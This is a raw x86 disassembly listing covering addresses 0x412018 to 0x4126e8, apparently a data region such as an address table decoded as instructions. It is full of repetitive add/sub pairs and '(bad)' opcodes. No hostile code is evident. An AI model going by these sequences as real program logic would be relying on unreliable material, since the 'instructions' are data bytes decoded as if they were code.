  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
